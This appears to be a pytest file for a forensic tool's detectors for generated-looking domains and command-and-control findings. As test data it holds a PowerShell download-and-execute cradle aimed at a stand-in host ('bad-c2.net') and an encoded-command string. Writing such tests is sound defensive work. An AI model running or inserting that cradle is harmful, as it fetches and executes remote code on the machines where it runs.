"""URL-shape / DGA-entropy structural signal + C2 corroboration-axis stacking.
Every value here is GENERIC (RFC5737 TEST-NET IPs, invented random labels) -- the
signals key on STRING STRUCTURE and CROSS-FACT axes, never on a domain/intel list.
"""
from sift_sentinel.analysis.malicious_semantics import (
    match_dga_domain, dga_host_score, c2_corroboration_axes,
    c2_finding_is_corroborated, MALICIOUS_SEMANTIC_SIGNALS,
)


# ---- DGA / URL-shape signal -------------------------------------------------
def test_high_entropy_random_host_is_dga():
    f = {"fact_type": "network_ioc_fact", "command": "GET http://x7k2p9qz3mw4vn8b.com/a"}
    assert match_dga_domain(f) is True


def test_raw_ip_url_is_dga():
    f = {"fact_type": "network_ioc_fact", "command": "http://203.0.113.50/payload"}
    assert match_dga_domain(f) is True


def test_odd_port_beacon_is_dga():
    f = {"fact_type": "network_ioc_fact", "command": "http://stage.example.org:4444/g"}
    assert match_dga_domain(f) is True


def test_normal_pronounceable_domain_is_not_dga():
    # a long but pronounceable, low-entropy vendor-shaped host on a normal port
    f = {"fact_type": "network_ioc_fact", "command": "https://updates.contoso.com:443/x"}
    assert match_dga_domain(f) is False


def test_known_good_vendor_never_dga():
    f = {"fact_type": "network_ioc_fact", "command": "https://download.microsoft.com/x"}
    assert match_dga_domain(f) is False


def test_dga_host_score_monotonic():
    assert dga_host_score("github") == 0            # short, pronounceable
    assert dga_host_score("kq7zx9wv2bj4nm6t") >= 2  # long, digit+consonant heavy


# ---- C2 corroboration-axis stacking ----------------------------------------
def _cradle_finding(extra_sigs=(), text=""):
    return {
        "finding_id": "Fx", "title": "ps download",
        "malicious_semantic_signals": ["c2_staging_domain", *extra_sigs],
        "claims": [{"type": "powershell_command_fact",
                    "command": "IEX (New-Object Net.WebClient).DownloadString('http://h.bad-c2.net/a')%s" % text}],
    }


def test_cradle_alone_is_one_axis_not_corroborated():
    f = _cradle_finding()
    axes = c2_corroboration_axes(f)
    assert "cradle" in axes
    assert c2_finding_is_corroborated(f) is False   # 1 axis -> needs-review


def test_cradle_plus_injection_is_corroborated():
    f = _cradle_finding(extra_sigs=["rwx_memory_region_with_unusual_protection"])
    axes = c2_corroboration_axes(f)
    assert {"cradle", "injection"} <= axes
    assert c2_finding_is_corroborated(f) is True    # 2 axes -> defensible confirm


def test_cradle_plus_obfuscation_is_corroborated():
    f = _cradle_finding(text=" ; powershell -EncodedCommand AAAA")
    assert {"cradle", "obfuscation"} <= c2_corroboration_axes(f)
    assert c2_finding_is_corroborated(f) is True


def test_cradle_plus_dga_signal_is_corroborated():
    f = _cradle_finding(extra_sigs=["dga_domain"])
    assert {"cradle", "dga"} <= c2_corroboration_axes(f)
    assert c2_finding_is_corroborated(f) is True


def test_non_c2_finding_has_no_axes():
    f = {"finding_id": "Fy", "title": "benign", "malicious_semantic_signals": [],
         "claims": [{"type": "process_fact", "process": "explorer.exe"}]}
    assert c2_corroboration_axes(f) == set()
    assert c2_finding_is_corroborated(f) is False


def test_dga_registered_as_signal():
    assert "dga_domain" in MALICIOUS_SEMANTIC_SIGNALS
    assert MALICIOUS_SEMANTIC_SIGNALS["dga_domain"]["matcher"] is match_dga_domain
